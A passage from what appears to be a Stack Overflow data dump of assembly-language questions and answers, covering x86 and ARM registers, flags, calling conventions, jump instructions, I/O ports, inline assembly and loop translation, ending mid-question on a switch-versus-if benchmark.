<p>The assembler sees that <code>foo</code> is at offset <code>0100h</code> from the base of <code>data SEGMENT</code>, so wherever it sees <code>offset foo</code> it will put the value <code>0100h</code>, regardless of the value of <code>DS</code> at the time.  </p>

<p>In the second example <code>DS</code> is <code>0300h</code>, so the base of the segment pointed to by <code>DS</code> is <code>03000h</code>.  This means that <code>ds:[offset foo]</code> points to the address <code>03000h + 0100h</code> which is the same as <code>02000h + 01100h</code>, which points to <code>bar</code>.</p>

<p>edit: corrected logical error in code</p>
","1669815"
"ARM to C calling convention, registers to save","47449","","<p>It's been a while since I last coded arm assembler and I'm a little rusty on the details. If I call a C function from arm,  I only have to worry about saving r0-r3 and lr, right? If the C function uses any other registers, is it responsible for saving those on the stack and restoring them? In other words, the compiler would generate code to do this for C functions.  For example if I use r10 in an assembler function, I don't have to push its value on the stack, or to memory, and pop/restore it after a C call, do I?</p>

<p>This is for arm-eabi-gcc 4.3.0.</p>

<p>I realise I could read the whole EABI, but then shortcutting RTFM is what SO is for, right? :-)</p>
","<p>It depends on the <a href=""http://en.wikipedia.org/wiki/Application_binary_interface"" rel=""noreferrer"">ABI</a> for the platform you are compiling for. On Linux, there are two ARM ABIs; the old one and the new one. AFAIK, the new one (EABI) is in fact ARM's AAPCS. The complete EABI definitions currently live <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.subset.swdev.abi/index.html"" rel=""noreferrer"">here on ARM's infocenter</a>.</p>

<p>From <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042f/IHI0042F_aapcs.pdf"" rel=""noreferrer"">the AAPCS, §5.1.1</a>:</p>

<ul>
<li><strong>r0-r3</strong> are the argument and scratch registers; <strong>r0-r1</strong> are also the result registers</li>
<li><strong>r4-r8</strong> are callee-save registers</li>
<li><strong>r9</strong> might be a callee-save register or not (on some variants of AAPCS it is a special register)</li>
<li><strong>r10-r11</strong> are callee-save registers</li>
<li><strong>r12-r15</strong> are special registers</li>
</ul>

<p>A callee-save register must be saved by the callee (in opposition to a caller-save register, where the caller saves the register); so, <em>if</em> this is the ABI you are using, you do not have to save r10 before calling another function (the other function is responsible for saving it).</p>

<p><strong>Edit:</strong> Which compiler you are using makes no difference; gcc in particular can be configured for several different ABIs, and it can even be changed on the command line. Looking at the prologue/epilogue code it generates is not that useful, since it is tailored for each function <em>and</em> the compiler can use other ways of saving a register (for instance, saving it in the middle of a function).</p>
","261496"
"Where can I find a comprehensive List of x86_64 Assembly Instructions?","47233","","<p>I'm doing a lab for a comp sci class that involves ""defusing a binary bomb,"" basically reverse engineering a program to gain 6 ""passwords.""  I was just looking for a list of all of the instructions in one, easy to read place.</p>
","<p>Intel's own manuals are available online.  They'll send you a printed copy for free, too:</p>

<p><a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">http://www.intel.com/products/processor/manuals/</a></p>
","67887"
"x86 Assembly Reference Sheet","46913","","<p>In my latest quest to learn some assembly language I'm finding myself constantly going to the web to find the definitions or descriptions for a particular register or mnemonic, ect.</p>

<p>I'm looking for a handy Reference Sheet that I can print up and refer to every time I see a symbol and I ""can't quite remember"" what it was.</p>

<p>Has anyone come across something like this on the web for themselves?</p>
","<p>This <a href=""http://ref.x86asm.net/"" rel=""noreferrer"">site</a> seems useful.</p>
","1933813"
"Assembly - JZ instruction after CMP","46511","","<p>I have the next instruction:</p>

<pre><code>cmp al, 1
jz mub
</code></pre>

<p>When al is 2 (10 in binary). What would do this instruction? As I know, I can use JE,JNE,JA etc., but what is meaning jz after cmp instruction?</p>

<p>Thanks</p>
","<p><code>jz</code> is ""jump if zero"". <code>cmp</code> subtracts its two operands, and sets flags accordingly. (See <a href=""http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Comparison_Instructions"" rel=""noreferrer"">here</a> for reference.)</p>

<p>If the two operands are equal, the subtraction will result in zero and the <code>ZF</code> flag will be set.</p>

<p>So in your sample, the jump will be taken if <code>al</code> was 1, not taken otherwise.</p>
","9342684"
"Carry Flag, Auxiliary Flag and Overflow Flag in Assembly","46131","","<p>I Cannot seem to tell the difference between the Carry Flag, Auxiliary Flag and Overflow Flag in Assembly. I'm currently studying it in school and the teacher didn't go into any details. Please help me to understand, I will be needing it for the exam. I will be really grateful!! From what I seem to know by now is that the Carry Flag is used when you try, let's say, 255+9 when you only have 8 bits for data, The Auxiliary Flag is the same, but only for the 4 last bits?? And The Overflow is used when you have 7 bits for the binary number and the 8(left-most ) is used for the sign???</p>
","<p>Carry Flag is a flag set when:</p>

<p>a) two unsigned numbers were added and the result is larger than ""capacity"" of register where it is saved. Ex: we wanna add two 8 bit numbers and save result in 8 bit register. In your example: 255 + 9 = 264 which is more that 8 bit register can store. So the value ""8"" will be saved there (264 &amp; 255 = 8) and CF flag will be set.</p>

<p>b) two unsigned numbers were subtracted and we subtracted the bigger one from the smaller one. Ex: 1-2 will give you 255 in result and CF flag will be set.</p>

<p>Auxiliary Flag is used as CF but when working with BCD. So AF will be set when we have overflow or underflow on in BCD calculations. 
 For example: considering 8 bit ALU unit, Auxiliary flag is set when there is  carry from 3rd bit to 4th bit i.e. carry from lower nibble to higher nibble. (<a href=""http://en.wikipedia.org/wiki/Half-carry_flag"" rel=""nofollow noreferrer"">Wiki link</a>)</p>

<p>Overflow Flag is used as CF but when we work on signed numbers. Ex we wanna add two 8 bit signed numbers: 127 + 2. the result is 129 but it is too much for 8bit signed number, so OF will be set. Similar when the result is too small like -128 - 1 = -129 which is out of scope for 8 bit signed numbers.</p>

<p>You can read more about flags on wikipedia</p>
","19301682"
"Difference between: Opcode, byte code, mnemonics, machine code and assembly","45622","","<p>I am quite new to this. I tried to understand the difference between the mentioned terms in a clear fashion, however, I am still confused. Here is what I have found:</p>

<ul>
<li><p>In computer assembler (or assembly) language, a mnemonic is an abbreviation for an operation. It's entered in the operation code field of each assembler program instruction. for example <code>AND AC,37</code> which means <code>AND</code> the <code>AC</code> register with <code>37</code>. so <code>AND</code>, <code>SUB</code> and <code>MUL</code> are mnemonic. They are get translated by the assembler.</p></li>
<li><p>Instructions (statements) in assembly language are generally very simple, unlike those in high-level programming languages. Generally, a mnemonic is a symbolic name for a single executable machine language instruction (an opcode), and there is at least one opcode mnemonic defined for each machine language instruction. Each instruction typically consists of an operation or opcode, plus zero or more operands.</p></li>
</ul>
","<p><strong>OPCODE</strong>: It is a number interpreted by your machine(virtual or silicon) that represents the operation to perform</p>

<p><strong>BYTECODE</strong>: Same as machine code, except, its mostly used by a software based interpreter(like Java or CLR)</p>

<p><strong>MNEMONIC</strong>: English word MNEMONIC means ""A device such as a pattern of letters, ideas, or associations that assists in remembering something."". So, its usually used by assembly language programmers to remember the ""OPERATIONS"" a machine can do, like ""ADD"" and ""MUL"" and ""MOV"" etc. This is assembler specific.</p>

<p><strong>MACHINE CODE</strong>: It is the sequence of numbers that flip the switches in the computer on and off to perform a certain job of work - such as addition of numbers, branching, multiplication, etc etc. This is purely machine specific and well documented by the implementers of the processor.</p>

<p><strong>Assembly</strong>: There are two ""assemblies"" - one assembly program is a sequence of mnemonics and operands that are fed to an ""assembler"" which ""assembles"" the mnemonics and operands into executable machine code. Optionally a ""linker"" links the assemblies and produces an executable file. </p>

<p>the second ""assembly"" in ""CLR"" based languages(.NET languages) is a sequence of CLR code infused with metadata information, sort of a library of executable code, but not directly executable.  </p>
","17638925"
"Protecting executable from reverse engineering?","45497","","<p>I've been contemplating how to protect my C/C++ code from disassembly and reverse engineering.  Normally I would never condone this behavior myself in my code; however the current protocol I've been working on must not ever be inspected or understandable, for the security of various people.</p>

<p>Now this is a new subject to me, and the internet is not really resourceful for <em>prevention against reverse engineering</em> but rather depicts tons of information on <em>how to reverse engineer</em></p>

<p>Some of the things I've thought of so far are:</p>

<ul>
<li>Code injection (calling dummy functions before and after actual function calls)</li>
<li>Code obfustication (mangles the disassembly of the binary)</li>
<li><p>Write my own startup routines (harder for debuggers to bind to)  </p>

<p></p>

<pre><code>void startup();  
int _start()   
{  
    startup( );  
    exit   (0)   
}  
void startup()  
{  
    /* code here */  
}
</code></pre></li>
<li><p>Runtime check for debuggers (and force exit if detected)</p></li>
<li><p>Function trampolines</p>

<p></p>

<pre><code> void trampoline(void (*fnptr)(), bool ping = false)  
 {  
   if(ping)  
     fnptr();  
   else  
     trampoline(fnptr, true);  
 }
</code></pre></li>
<li><p>Pointless allocations and deallocations (stack changes a lot)</p></li>
<li>Pointless dummy calls and trampolines (tons of jumping in disassembly output)</li>
<li>Tons of casting (for obfuscated disassembly)</li>
</ul>

<p>I mean these are some of the things I've thought of but they can all be worked around and or figured out by code analysts given the right time frame.  Is there anything else alternative I have?</p>
","<p>What Amber said is exactly right.  You can make reverse engineering harder, but you can never prevent it.  You should never trust <a href=""http://en.wikipedia.org/wiki/Security_through_obscurity"" rel=""noreferrer"">""security"" that relies on the prevention of reverse engineering</a>.</p>

<p>That said, the best anti-reverse-engineering techniques that I've seen focused not on obfuscating the code, but instead on breaking the tools that people usually use to understand how code works.  Finding creative ways to break disassemblers, debuggers, etc is both likely to be more effective and also more intellectually satisfying than just generating reams of horrible spaghetti code.  This does nothing to block a determined attacker, but it does increase the likelihood that J Random Cracker will wander off and work on something easier instead.</p>
","6481695"
"Is there syntax highlighting for assembly in Sublime Text 2?","45259","","<p>I'm unable to highlight my assembly.</p>
","<p>No, but since Sublime Text 2 can read Textmate language definition files (.tmLanguage files), you could easily add support to Assembly by copying something like <a href=""https://github.com/foxostro/x86-assembly-textmate-bundle"">https://github.com/foxostro/x86-assembly-textmate-bundle</a> to your ""Packages"" directory (<code>C:\Users\hugo\AppData\Roaming\Sublime Text 2\Packages</code> on my Win7).</p>
","9200897"
"Greater than, less than equal, greater than equal in MIPS","44789","","<p>Given two registers <code>$s0</code>, <code>$s1</code>, how can I convert the following pseudocode into MIPS assembly language using only the <code>slt</code> (set on less than) and <code>beq</code> and <code>bne</code> (branch if equal, branch if not equal) instructions.</p>

<pre><code>   if ($s0 &gt; $s1) { goto label1 }
   if ($s0 &gt;= $s1) { goto label2 }
   if ($s0 &lt;= $s1) { go to label3 }
</code></pre>
","<pre><code>slt $t1,$s1,$s0      # checks if $s0 &gt; $s1
beq $t1,1,label1     # if $s0 &gt; $s1, goes to label1
beq $s1,$s2,label2   # if $s0 = $s2, goes to label2 
beq $t1,$zero,label3 # if $s0 &lt; $s1, goes to label3
</code></pre>

<p>I'm assuming that the pseudocode executes sequentially, and that you can't go to two different labels.</p>
","15184332"
"How to set 1 second time delay at assembly language 8086","44741","","<p>My problem is that I have written a code that is supposed to output a result into a set of LEDs connected to the parallel port. When I ran the code it pretty much did nothing. My instructor told me that the code ran too fast that my eyes did not see what happened. </p>

<p>I have found that there are a couple of ways to do a time delay, I have tried to loop the NOP but I think I cannot really determine what is going on. Is there any better way? </p>

<p>I have here a part of the code where I have to add a time delay into: </p>

<pre><code>org 100h

mov ax, 0
mov dx, 378
out dx, ax
mov ax, 1  

; 1st

mov cx, 1ah
start1st:
mov ax, 1
left:
out dx, ax 
; --------------------------------&gt; how to loop?
mov bx, 2
mul bx
cmp ax, 80h
jl left
dec cx
cmp cx,0
jg start1st
; end 1st 
</code></pre>
","<p>What i finally ended up using was the nop loop</p>

<pre><code>; start delay

mov bp, 43690
mov si, 43690
delay2:
dec bp
nop
jnz delay2
dec si
cmp si,0    
jnz delay2
; end delay
</code></pre>

<p>I used two registers which I set them both to any high value
and its gonna keep on looping until both values go to zero </p>

<p>What I used here was <code>AAAA</code> for both <code>SI and BP</code>, i ended up with roughly 1 second for each delay loop. </p>

<p>Thanks for the help guys, and yes, we still use MS DOS for this assembly language course :(</p>
","15251700"
"What does ""int 21h"" mean in Assembly?","44328","","<p>I'm new to learning assembly language, and I'm wondering what the command <code>int 21h</code> means. For example:</p>

<pre><code> mov ah,01h
 int 21h
</code></pre>

<p>Which should read a key from the user. Thanks in advance for your answer.</p>
","<p><code>int 21h</code> means, call the interrupt handler 0x21 which is the DOS Function dispatcher. the ""mov ah,01h"" is setting AH with 0x01, which is the Keyboard Input with Echo handler in the interrupt. See:</p>

<p><a href=""http://spike.scu.edu.au/~barry/interrupts.html"" rel=""noreferrer"">http://spike.scu.edu.au/~barry/interrupts.html</a></p>
","6293737"
"What are IN & OUT instructions in x86 used for?","44007","","<p>I've encoutered these to instructions IN &amp; OUT while reading ""Understanding Linux Kernel"" book. I've looked up reference manual.</p>

<blockquote>
  <p><strong>5.1.9   I/O Instructions</strong></p>
  
  <p>These instructions move data between
  the processor’s I/O ports and a
  register or memory.</p>

<pre><code>IN    Read from a port
OUT   Write to a port
INS/INSB  Input string from port/Input byte string from port 
INS/INSW  Input string from port/Input word string from port 
INS/INSD  Input string from port/Input doubleword string from port
OUTS/OUTSB    Output string to port/Output byte string to port 
OUTS/OUTSW    Output string to port/Output word string to port 
OUTS/OUTSD    Output string to port/Output doubleword string to port
</code></pre>
</blockquote>

<p>I didn't get few things:</p>

<ol>
<li>""processor’s I/O ports"". What are they? Why would we want to read &amp; write ""strings"" to &amp; from these ports?</li>
<li>I never encoutered a scenerio where I need to use these instructions. When would I be needing these? </li>
<li>Give some practical examples.</li>
</ol>
","<p>You know how memory addressing works? There's an address bus, a data bus, and some control lines. The CPU puts the address of a byte (or a beginning byte) of memory on the address bus, then  raises the READ signal, and some RAM chip hopefully returns the contents of memory at that address by raising or lowering individual lines (corresponding to bits in the byte(s)) on the data bus. This works for both RAM and ROM.</p>

<p>But then there are also I/O devices: Serial and parallel ports, the driver for a PC's tiny internal speaker, disk controllers, sound chips and so on. And those devices also get read from and written to. They also need to be addressed so the CPU accesses the correct device and (usually) the correct data location within a given device.</p>

<p>For some CPU models including the xxx86 series as found in most ""modern"" PCs, I/O devices share the address space with memory. Both RAM/ROM and IO devices are connected to the same address, data and control lines. For example, the serial port for COM1 is addressed starting at (hex) 03F8. But there's almost certainly memory at the same address.</p>

<p>Here's a really simple diagram:</p>

<p>[<img src=""https://i.stack.imgur.com/ra1Km.jpg"" alt=""https://qph.ec.quoracdn.net/main-qimg-e510d81162f562d8f671d5900da84d68-c?convert_to_webp=true"">]</p>

<p>Clearly the CPU needs to talk to either memory or the I/O device, never both. To distinguish between the two, one of the control lines called ""M/#IO"" asserts whether the CPU wants to talk to memory (line=high) or an I/O device (line=low).</p>

<p>The IN instruction reads from an I/O device, OUT writes. When you use the IN or OUT instructions, the M/#IO is not asserted (held low), so memory doesn't respond and the I/O chip does. For the memory-oriented instructions, M/#IO is asserted so CPU talks to the RAM, and IO devices stay out of the communication.</p>

<p>Under certain conditions the IO devices can drive the data lines and the RAM can read them at the same time. And vice versa. It's called DMA.</p>

<p>Traditionally, serial and printer ports, as well as keyboard, mouse, temperature sensors and so forth were I/O devices. Disks were sort of in between; data transfers would be initiated by I/O commands but the disk controller would usually direct-deposit its data in system memory.</p>

<p>In modern operating systems like Windows or Linux, access to I/O ports is hidden away from ""normal"" user programs, and there are layers of software, privileged instructions and drivers to deal with the hardware. So in this century, most programmers don't deal with those instructions.</p>
","3215958"
"Why is there not a register that contains the higher bytes of EAX?","43638","","<p><code>%AX = (%AH + %AL)</code></p>

<p>So why not <code>%EAX = (%SOME_RESTIER + %AX)</code> for some register <code>%SOME_REGISTER</code>? </p>
","<p>Just for some clarification. In the early microprocessor days of the 1970's, CPUs had only a small number of registers and a very limited instruction set. Typically, the arithmetic unit could only operate on a single CPU register, often referred to as the ""accumulator"". The accumulator on the 8 bit 8080 &amp; Z80 processors was called ""A"". There were 6 other general purpose 8 bit registers: B, C, D, E, H &amp; L. These six registers could be paired up to form 3 16 bit registers: BC, DE &amp; HL. Internally, the accumulator was combined with the Flags register to form the AF 16 bit register.</p>

<p>When Intel developed the 16 bit 8086 family they wanted to be able to port 8080 code, so they kept the same basic register structure:</p>

<pre><code>8080/Z80  8086
A         AX
BC        BX
DE        CX
HL        DX
IX        SI    
IY        DI
</code></pre>

<p>Because of the need to port 8 bit code they needed to be able to refer to the individual 8 bit parts of AX, BX, CX &amp; DX. These are called AL, AH for the low &amp; high bytes of AX and so on for BL/BH, CL/CH &amp; DL/DH. IX &amp; IY on the Z80 were only ever used as 16 bit pointer registers so there was no need to access the two halves of SI &amp; DI.</p>

<p>When the 80386 was released in the mid 1980s they created ""extended"" versions of all the registers. So, AX became EAX, BX became EBX etc. There was no need to access to top 16 bits of these new extended registers, so they didn't create an EAXH pseudo register.</p>

<p>AMD applied the same trick when they produced the first 64 bit processors. The 64 bit version of the AX register is called RAX. So, now you have something that looks like this:</p>

<pre><code>|63..32|31..16|15-8|7-0|
               |AH.|AL.|
               |AX.....|
       |EAX............|
|RAX...................|
</code></pre>
","228367"
"What is the purpose of the EBP frame pointer register?","42965","","<p>I'm a beginner in assembly language and have noticed that the x86 code emitted by compilers usually keeps the frame pointer around even in release/optimized mode, when it could use the EBP register for something else.  I understand why the frame pointer might make code easier to debug, and might be necessary if alloca() is called within a function.  However, x86 has very few registers, and using two of them to hold the location of the stack frame when one would suffice just doesn't make sense to me.  Why is omitting the frame pointer considered a bad idea even in optimized/release builds?</p>
","<p>Frame pointer is a reference pointer allowing a debugger to know where local variable or an argument is at with a single constant offset. Although ESP's value changes over the course of execution, EBP remains the same making it possible to reach the same variable at the same offset (such as first parameter will always be at EBP+8 while ESP offsets can change significantly since you'll be pushing/popping things)</p>

<p>Why don't compilers throw away frame pointer? Because with frame pointer, the debugger can figure out where local variables and arguments are using the symbol table since they are guaranteed to be at a constant offset to EBP. Otherwise there isn't an easy way to figure where a local variable is at any point in code.</p>

<p>As Greg mentioned, it also helps stack unwinding for a debugger since EBP provides a reverse linked list of stack frames therefore letting the debugger to figure out size of stack frame (local variables + arguments) of the function.</p>

<p>Most compilers provide an option to omit frame pointers although it makes debugging really hard. That option should never be used globally, even in release code. You don't know when you'll need to debug a user's crash.</p>
","579311"
"While, Do While, For loops in Assembly Language (emu8086)","42741","","<p>I want to convert simple loops in high-level languages into assembly language (for emu8086) say, I have this code:</p>

<pre><code> for(int x = 0; x&lt;=3; x++)
 {
  //Do something!
 }
</code></pre>

<p>or</p>

<pre><code> int x=1;
 do{
 //Do something!
 }
 while(x==1)
</code></pre>

<p>or</p>

<pre><code> while(x==1){
 //Do something
 }
</code></pre>

<p>How do I do this in emu8086? </p>
","<h1>For-loops:</h1>

<p>For-loop in C:</p>

<pre><code>for(int x = 0; x&lt;=3; x++)
{
    //Do something!
}
</code></pre>

<p>The same loop in 8086 assembler:</p>

<pre><code>        xor cx,cx   ; cx-register is the counter, set to 0
loop1   nop         ; Whatever you wanna do goes here, should not change cx
        inc cx      ; Increment
        cmp cx,3    ; Compare cx to the limit
        jle loop1   ; Loop while less or equal
</code></pre>

<p>That is the loop if you need to access your index (cx). If you just wanna to something 0-3=4 times but you do not need the index, this would be easier:</p>

<pre><code>        mov cx,4    ; 4 iterations
loop1   nop         ; Whatever you wanna do goes here, should not change cx
        loop loop1  ; loop instruction decrements cx and jumps to label if not 0
</code></pre>

<p>If you just want to perform a very simple instruction a constant amount of times, you could also use an assembler-directive which will just hardcore that instruction</p>

<pre><code>times 4 nop
</code></pre>

<h1>Do-while-loops</h1>

<p>Do-while-loop in C:</p>

<pre><code>int x=1;
do{
    //Do something!
}
while(x==1)
</code></pre>

<p>The same loop in assembler:</p>

<pre><code>        mov ax,1
loop1   nop         ; Whatever you wanna do goes here
        cmp ax,1    ; Check wether cx is 1
        je loop1    ; And loop if equal
</code></pre>

<h1>While-loops</h1>

<p>While-loop in C:</p>

<pre><code>while(x==1){
    //Do something
}
</code></pre>

<p>The same loop in assembler:</p>

<pre><code>        jmp loop1   ; Jump to condition first
cloop1  nop         ; Execute the content of the loop
loop1   cmp ax,1    ; Check the condition
        je cloop1   ; Jump to content of the loop if met
</code></pre>

<p>For the for-loops you should take the cx-register because it is pretty much standard. For the other loop conditions you can take a register of your liking. Of course replace the no-operation instruction with all the instructions you wanna perform in the loop.</p>
","29185948"
"Why does leave do ""mov esp,ebp"" in x86 assembly?","42647","","<p>It's said that the <code>leave</code> instruction is the same as :</p>

<pre><code>mov esp,ebp
pop ebp
</code></pre>

<p>But what is <code>mov esp,ebp</code> here for? It doesn't seem valid to me...</p>
","<p><code>mov esp,ebp</code> sets the stack pointer to the base frame address, effectively releasing the whole frame. (Don't forget that this is Intel syntax, the destination comes first.) If you didn't do it, once you call <code>ret</code>, you would still be using the called function's stack frame with your calling function, with crashtastic consequences.</p>
","5474471"
"what does movsbl instruction do?","42595","","<p>I have searched on the net, but i couldn't find a clear example to understand what does this instruction do. So, if someone can give an example about this, it will be very helpful to me.</p>
","<p>Move with sign extend from byte to longword. In Intel syntax, the mnemonic of this instruction is MOVSX.</p>

<p>A C compiler may use this instruction when a variable of type <code>int8_t</code> needs to be converted to <code>int</code>, which happens automatically on arithmetic and a few other operations (integer promotion).</p>

<p>Because this instruction writes to all 32 (or 64) bits of the destination register, it avoids performance penalties that may result from writing to only the low 8 (or 16) bits of a register. A similar set of instructions allows extending with zero bits (MOVZX in Intel syntax, MOVZst in AT&amp;T syntax (from size s to size t)).</p>
","7861177"
"What is the purpose of XORing a register with itself?","42586","","<p><code>xor eax, eax</code> will always set <code>eax</code> to zero, right? So, why does MSVC++ sometimes put it in my executable's code? Is it more efficient that <code>mov eax, 0</code>?</p>

<pre><code>012B1002  in          al,dx 
012B1003  push        ecx  
    int i = 5;
012B1004  mov         dword ptr [i],5 
    return 0;
012B100B  xor         eax,eax 
</code></pre>

<p>Also, what does it mean to do <code>in al, dx</code>?</p>
","<p>Yes, it is more efficient.</p>

<p>The opcode is shorter than <code>mov eax, 0</code>, only 2 bytes, and the processor recognizes the special case and treats it as a <code>mov eax, 0</code> without a false read dependency on <code>eax</code>, so the execution time is the same.</p>
","1396552"
"What is the 0x10 in the ""leal 0x10(%ebx), %eax"" x86 assembly instruction?","41960","","<p>What the function is of the 0x10 in regards to this LEAL instruction?  Is it a multiply or addition or is something else?</p>

<pre><code>leal 0x10(%ebx), %eax
</code></pre>

<p>Can someone please clarify? This is x86 assembler on a Linux box.</p>
","<p>leal, or lea full name is ""Load effective address"" and it does exactly this: It does an address calculation.</p>

<p>In your example the address calculation is very simple, because it just adds a offset to ebx and stores the result in eax:</p>

<p>eax = ebx + 0x10</p>

<p>lea can do a lot more. It can add registers, multiply registers with the constants 2, 4 and 8 for address calculations of words, integers and doubles. It can also add an offset. </p>

<p>Note that lea is special in the way that it will never modify the flags, even if you use it as a simple addition like in the example above. Compilers sometimes exploit this feature and replace an addition by a lea to help the scheduler. It's not uncommon to see lea instructions doing simple arithmetic in compiled code for that reason.</p>
","4003928"
"What is the ""FS""/""GS"" register intended for?","41845","","<p>So I know what the following registers and their uses are supposed to be:</p>

<ul>
<li><p>CS = Code Segment (used for IP)</p></li>
<li><p>DS = Data Segment (used for MOV)</p></li>
<li><p>ES = Destination Segment (used for MOVS, etc.)</p></li>
<li><p>SS = Stack Segment (used for SP)</p></li>
</ul>

<p>But what are the following registers intended to be used for?</p>

<ul>
<li><p>FS = ""File Segment""?</p></li>
<li><p>GS = ???</p></li>
</ul>

<p>Note: I'm <strong>not</strong> asking about any particular operating system -- I'm asking about what they were intended to be used for by the CPU, if anything.</p>
","<p>There is what they were intended for, and what they are used for by Windows and Linux.</p>

<p>The original intention behind the segment registers was to allow a program to access many different (large) segments of memory that were intended to be independent and part of a persistent virtual store.  The idea was taken from the <a href=""http://en.wikipedia.org/wiki/Multics"" rel=""noreferrer"">1966 Multics operating system</a>, that treated files as simply addressable memory segments.  No BS ""Open file, write record, close file"", just ""Store this value into that virtual data segment"" with dirty page flushing.</p>

<p>Our current 2010 operating systems are a giant step backwards, which is why they are called ""Eunuchs"".  You can only address <em>your</em> process space's single segment, giving a so-called ""flat (IMHO dull) address space"".  The segment registers on the x86-32 machine can still be used for real segment registers, but nobody has bothered (Andy Grove, former Intel president, had a rather famous public fit last century when he figured out after all those Intel engineers spent energy and his money to implement this feature, that nobody was going to use it.  Go, Andy!)</p>

<p>AMD in going to 64 bits decided they didn't care if they eliminated Multics as a choice (that's the charitable interpretation; the uncharitable one is they were clueless about Multics) and so disabled the general capability of segment registers in 64 bit mode.  There was still a need for threads to access thread local store, and each thread needed a a pointer ... somewhere in the immediately accessible thread state (e.g, in the registers) ... to thread local store.  Since Windows and Linux both used FSand GS (thanks Nick for the clarification) for this purpose in the 32 bit version, AMD decided to let the 64 bit segment registers (GS and FS) be used essentially only for this purpose (I think you can make them point anywhere in your process space; dunno if the application code can load them or not).  Intel in their panic to not lose market share to AMD on 64 bits, and Andy being retired, decided to just copy AMD's scheme.</p>

<p>It would have been architecturally prettier IMHO to make each thread's memory map have an absolute virtual address (e.g, 0-FFF say) that was its thread local storage (no [segment] register pointer needed!); I did this in an 8 bit OS back in the 1970s and it was extremely handy, like having another big stack of registers to work in.</p>

<p>So, the segment registers are now kind of like your appendix.  They serve a vestigial purpose.   To our collective loss. </p>

<p>Those that don't know history aren't doomed to repeat it; they're doomed to doing something dumber. </p>
","10810340"
"Assembly JLE jmp instruction example","41626","","<p>How do you use the <a href=""http://www.laynetworks.com/assembly%20tutorials3.htm#jump"" rel=""noreferrer"">jump family</a> of instructions?</p>

<p>This is what they've got:</p>

<blockquote>
JL label
<br />
""It"" jumps if it is less than or if it is not larger than or equal to.
</blockquote>

<p>My question is <em>what is <strong>it</em></strong> in this sentence?  Say I have a variable in <code>ebx</code> and I want to jump to label <code>there:</code> if <code>ebx</code> is <code>&lt;= 10</code>.</p>

<p>Specifically I'm interested in using the <a href=""http://en.wikipedia.org/wiki/X86_instruction_listings"" rel=""noreferrer"">x86</a> jump family of instructions</p>
","<p>The jump itself checks the flags in the EFL register. These are usually set with TEST or CMP(or as a side effect of many other instructions).</p>

<pre><code>CMP ebx,10
JLE there
</code></pre>

<ul>
<li>CMP corresponds to calculating the difference of the operands, updating the flags and discarding the result. Typically used for greater/smaller checks</li>
<li>TEST corresponds to calculating the binary AND of the operands, updating the flags and discarding the result. Typically used for equality checks.</li>
</ul>

<p>See also: <a href=""http://books.google.com/books?id=094tYob7ipQC&amp;pg=PA378&amp;lpg=PA378&amp;dq=CMP+instruction&amp;source=bl&amp;ots=e687FSncG9&amp;sig=jVzoRmeztIOsniN9wfQQLYhVI1E&amp;hl=en&amp;ei=ZJEbTY6gG8Ttsga82e3YDA&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=2&amp;ved=0CBYQ6AEwATgK#v=onepage&amp;q=CMP%20instruction&amp;f=false"" rel=""noreferrer"">The art of assembly language on CMP</a></p>

<p>As a sidenote: You should get the <a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">Intel reference manuals</a>. In particular the two part ""Intel® 64 and IA-32 Architectures Software Developer's Manual Volume 2: Instruction Set Reference"" which describes all x86 instructions.</p>
","4557301"
"What does ORG Assembly Instruction do?","41406","","<p>can anyone give me a comprehensive description about ORG directive?<br>
When and why is it used in assembly written applications?</p>

<p>Using Nasm on x86 or AMD64.</p>
","<p>ORG is used to set the assembler <em>location counter</em>. This may or may not translate to a load address at link time. It can be used to define absolute addresses, e.g. when defining something like interrupt vectors which may need to be at a fixed address, or it can be used to introduce padding or generate a specific alignment for the following code.</p>
","3407190"
"Is there a way to insert assembly code into C?","41174","","<p>I remember back in the day with the old borland DOS compiler you could do something like this:</p>

<pre><code>asm {
 mov ax,ex
 etc etc...
}
</code></pre>

<p>Is there a semi-platform independent way to do this now? I have a need to make a BIOS call, so if there was a way to do this without asm code, that would be equally useful to me.</p>
","<p>Using <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html"" rel=""noreferrer"">GCC</a></p>

<pre><code>__asm__(""movl %edx, %eax\n\t""
        ""addl $2, %eax\n\t"");
</code></pre>

<p>Using <a href=""http://msdn.microsoft.com/en-us/library/4ks26t93(VS.71).aspx"" rel=""noreferrer"">VC++</a></p>

<pre><code>__asm {
  mov eax, edx
  add eax, 2
}
</code></pre>
","61350"
"Best Assembly IDE for Windows","40879","","<p>What is the best IDE for Assembly programming in Windows? (It should work for either MASM, TASM, or NASM, although any asm will do=P).</p>

<p>Commercial or FOSS is fine.</p>
","<p>i found this <a href=""http://www.programmersheaven.com/download/23476/download.aspx"" rel=""noreferrer"">http://www.programmersheaven.com/download/23476/download.aspx</a></p>

<p>there is winasm as well , here <a href=""http://www.winasm.net/"" rel=""noreferrer"">http://www.winasm.net/</a></p>

<p>but i'll keep this post updated</p>
","4703335"
"Is 'switch' faster than 'if'?","40731","","<p>Is a <code>switch</code> statement <em>actually</em> faster than an <code>if</code> statement?</p>

<p>I ran the code below on Visual Studio 2010's x64 C++ compiler with the <code>/Ox</code> flag:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

#define MAX_COUNT (1 &lt;&lt; 29)
size_t counter = 0;

size_t testSwitch()
{
    clock_t start = clock();
    size_t i;
    for (i = 0; i &lt; MAX_COUNT; i++)
    {
        switch (counter % 4 + 1)
        {
            case 1: counter += 4; break;
            case 2: counter += 3; break;
            case 3: counter += 2; break;
            case 4: counter += 1; break;
        }
    }
    return 1000 * (clock() - start) / CLOCKS_PER_SEC;
}

size_t testIf()
{
    clock_t start = clock();
    size_t i;
    for (i = 0; i &lt; MAX_COUNT; i++)
    {
        const size_t c = counter % 4 + 1;
        if (c == 1) { counter += 4; }
        else if (c == 2) { counter += 3; }
        else if (c == 3) { counter += 2; }
        else if (c == 4) { counter += 1; }
    }
    return 1000 * (clock() - start) / CLOCKS_PER_SEC;
}

int main()
{
    printf(""Starting...\n"");
    printf(""Switch statement: %u ms\n"", testSwitch());
    printf(""If     statement: %u ms\n"", testIf());
}
</code></pre>

<p>and got these results:</p>

<blockquote>
